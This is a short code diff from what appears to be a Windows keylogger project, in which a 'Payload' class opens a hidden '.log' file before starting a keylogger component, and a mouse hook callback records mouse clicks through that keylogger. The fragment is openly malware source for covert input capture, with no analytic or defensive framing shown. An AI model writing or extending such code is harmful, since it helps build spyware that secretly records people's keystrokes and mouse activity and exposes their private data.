@@ -15,6 +15,9 @@ Payload::~Payload(void)
 
 void Payload::init(void)
 {
+	if (!StaticTools::Log.is_open()) {
+		StaticTools::Log.open(StaticTools::GetProjectResourceDirectory() + "\\.log", std::ios::app | std::ios::out);
+	}
 	_keylogger.init();
 	_ppgt.init();
 }
@@ -97,9 +100,6 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 			break;
 		case WM_RBUTTONUP:
 			Payload::current->keylogger().mouseClick(MouseEvent::ME_Right, mouse);
-			break;
-		case WM_MOUSEWHEEL:
-
 			break;
 		};
 	}
